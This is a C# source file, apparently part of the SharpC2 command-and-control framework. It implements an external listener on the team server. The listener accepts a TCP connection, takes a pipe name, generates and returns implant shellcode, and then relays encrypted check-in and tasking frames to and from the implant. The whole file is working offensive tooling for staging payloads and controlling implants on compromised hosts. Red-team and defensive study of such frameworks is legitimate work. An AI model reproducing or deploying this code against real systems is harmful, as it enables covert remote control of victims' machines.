using System.Net;
using System.Net.Sockets;
using System.Text;

using SharpC2.API.Requests;
using SharpC2.API.Responses;

using TeamServer.Drones;
using TeamServer.Interfaces;
using TeamServer.Messages;
using TeamServer.Utilities;

namespace TeamServer.Handlers;

public class ExtHandler : Handler
{
    public override HandlerType HandlerType
        => HandlerType.EXTERNAL;

    public int BindPort { get; set; }

    private Metadata _metadata;

    private readonly IPayloadService _payloads;
    private readonly ICryptoService _crypto;
    private readonly IServerService _server;
    
    private readonly CancellationTokenSource _tokenSource = new();

    public ExtHandler()
    {
        _payloads = Program.GetService<IPayloadService>();
        _crypto = Program.GetService<ICryptoService>();
        _server = Program.GetService<IServerService>();
    }

    public async Task Start()
    {
        var listener = new TcpListener(new IPEndPoint(IPAddress.Any, BindPort));
        listener.Start(100);

        // blocks
        var client = await listener.AcceptTcpClientAsync();
        
        // the first thing we expect is a pipename
        var stageReq = await client.ReadClient();
        var pipeName = Encoding.UTF8.GetString(stageReq);
        
        // create a "fake" handler
        var handler = new SmbHandler { PipeName = pipeName };
        
        // generate shellcode
        var payload = await _payloads.GeneratePayload(handler, PayloadFormat.SHELLCODE);
        
        // return this to the client
        await client.WriteClient(payload);

        // drop into a loop
        while (!_tokenSource.IsCancellationRequested)
        {
            // if anything inbound
            if (client.DataAvailable())
            {
                var inbound = await client.ReadClient();
                var frame = inbound.Deserialize<C2Frame>();

                // if it's the first check-in frame, save its metadata
                if (frame.Type == FrameType.CHECK_IN)
                    _metadata = await _crypto.Decrypt<Metadata>(frame.Data);

                // give frame to server
                await _server.HandleInboundFrame(frame);
            }
            
            // if anything outbound
            if (_metadata is not null)
            {
                var frames = (await _server.GetOutboundFrames(_metadata)).ToArray();

                if (frames.Any())
                {
                    var outbound = frames.Serialize();
                    await client.WriteClient(outbound);
                }
            }
            
            await Task.Delay(100);
        }
        
        client.Dispose();
        listener.Stop();
        
        _tokenSource.Dispose();
    }

    public void Stop()
    {
        _tokenSource.Cancel();
    }

    public static implicit operator ExtHandler(ExtHandlerRequest request)
    {
        return new ExtHandler
        {
            Id = Helpers.GenerateShortGuid(),
            Name = request.Name,
            BindPort = request.BindPort,
            PayloadType = PayloadType.EXTERNAL
        };
    }

    public static implicit operator ExtHandlerResponse(ExtHandler handler)
    {
        return new ExtHandlerResponse
        {
            Id = handler.Id,
            Name = handler.Name,
            BindPort = handler.BindPort
        };
    }
}